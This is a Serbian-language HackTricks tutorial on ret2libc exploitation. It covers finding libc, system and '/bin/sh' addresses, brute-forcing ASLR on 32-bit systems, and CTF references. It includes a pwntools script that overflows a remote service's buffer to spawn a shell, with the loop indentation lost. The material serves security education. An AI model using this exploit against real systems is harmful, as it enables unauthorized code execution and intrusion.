# Ret2lib

{{#include ../../../banners/hacktricks-training.md}}

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje toka izvršavanja ranjivog programa na funkciju unutar deljene biblioteke (npr., **system**, **execve**, **strcpy**) umesto izvršavanja napadačevog shell koda na steku. Napadač kreira payload koji menja adresu povratka na steku da pokazuje na željenu funkciju biblioteke, dok takođe obezbeđuje da su svi potrebni argumenti ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (pojednostavljeno)**

- Dobiti adresu funkcije koju treba pozvati (npr. system) i komandu koju treba pozvati (npr. /bin/sh)
- Generisati ROP lanac da prosledi prvi argument koji pokazuje na string komande i tok izvršavanja funkciji

## Pronalaženje adresa

- Pretpostavljajući da je `libc` koja se koristi ona sa trenutnog računara, možete pronaći gde će biti učitana u memoriji sa:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Ako želite da proverite da li ASLR menja adresu libc, možete uraditi:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Poznavanje korišćene libc takođe omogućava pronalaženje ofseta do `system` funkcije sa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Poznavanje korišćenog libc-a takođe omogućava pronalaženje ofseta do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Koristeći gdb-peda / GEF

Poznavajući korišćenu libc, takođe je moguće koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Korišćenje /proc/\<PID>/maps

Ako proces kreira **decu** svaki put kada razgovarate s njim (mrežni server), pokušajte da **pročitate** tu datoteku (verovatno će vam biti potrebna root privilegija).

Ovde možete pronaći **tačno gde je libc učitan** unutar procesa i **gde će biti učitan** za svaku decu procesa.

![](<../../../images/image (853).png>)

U ovom slučaju, učitan je u **0xb75dc000** (Ovo će biti osnovna adresa libc)

## Nepoznata libc

Može biti moguće da **ne znate koju libc binarni fajl učitava** (jer se možda nalazi na serveru kojem nemate pristup). U tom slučaju, mogli biste iskoristiti ranjivost da **procurite neke adrese i saznate koja libc** biblioteka se koristi:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

I možete pronaći pwntools šablon za ovo u:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

### Poznavanje libc sa 2 ofseta

Proverite stranicu [https://libc.blukat.me/](https://libc.blukat.me/) i koristite **nekoliko adresa** funkcija unutar libc da biste saznali **korisćenu verziju**.

## Obilaženje ASLR na 32 bita

Ovi napadi brute-force su **samo korisni za 32bitne sisteme**.

- Ako je exploit lokalni, možete pokušati da brute-force-ujete osnovnu adresu libc (korisno za 32bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Ako napadate udaljeni server, možete pokušati da **brute-force-ujete adresu `libc` funkcije `usleep`**, prosledjujući kao argument 10 (na primer). Ako u nekom trenutku **serveru treba dodatnih 10s da odgovori**, pronašli ste adresu ove funkcije.

## One Gadget

Izvršite shell jednostavno skakanjem na **jednu** specifičnu **adresu** u libc:

{{#ref}}
one-gadget.md
{{#endref}}

## x86 Ret2lib Primer Koda

U ovom primeru ASLR brute-force je integrisan u kod i ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Primerak Koda

Proverite primer iz:

{{#ref}}
../
{{#endref}}

## ARM64 Ret2lib Primerak

U slučaju ARM64, ret instrukcija skače na mesto na koje pokazuje x30 registar, a ne na mesto na koje pokazuje registar steka. Tako da je malo komplikovanije.

Takođe, u ARM64, instrukcija radi ono što instrukcija radi (nije moguće skočiti usred instrukcija i transformisati ih u nove).

Proverite primer iz:

{{#ref}}
ret2lib-+-printf-leak-arm64.md
{{#endref}}

## Ret-into-printf (ili puts)

Ovo omogućava **curenje informacija iz procesa** pozivanjem `printf`/`puts` sa nekim specifičnim podacima postavljenim kao argument. Na primer, stavljanje adrese `puts` u GOT prilikom izvršavanja `puts` će **curiti adresu `puts` u memoriji**.

## Ret2printf

Ovo u suštini znači zloupotrebu **Ret2lib da se transformiše u ranjivost format stringova `printf`** korišćenjem `ret2lib` za pozivanje printf sa vrednostima za eksploataciju (zvuči besmisleno, ali je moguće):

{{#ref}}
../../format-strings/
{{#endref}}

## Ostali Primeri & reference

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, uz curenje adrese funkcije u libc, koristeći jedan gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bita, ASLR omogućeno, ali bez PIE, prvi korak je popuniti preliv do bajta 0x00 kanarija da bi se zatim pozvao puts i curio. Sa kanarijom se kreira ROP gadget za pozivanje puts da curi adresu puts iz GOT-a i ROP gadget za pozivanje `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bita, ASLR omogućeno, bez kanarija, preliv steka u main iz funkcije deteta. ROP gadget za pozivanje puts da curi adresu puts iz GOT-a, a zatim poziva jedan gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bita, bez pie, bez kanarija, bez relro, nx. Koristi write funkciju da curi adresu write (libc) i poziva jedan gadget.
- [https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html)
- Koristi format string da curi kanarija iz steka i preliv bafera da pozove system (to je u GOT-u) sa adresom `/bin/sh`.
- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)
- 32 bita, bez relro, bez kanarija, nx, pie. Zloupotreba lošeg indeksiranja da curi adrese libc i heap-a iz steka. Zloupotreba prelivanja bafera da se uradi ret2lib pozivajući `system('/bin/sh')` (adresa heap-a je potrebna da bi se zaobišla provera).

{{#include ../../../banners/hacktricks-training.md}}
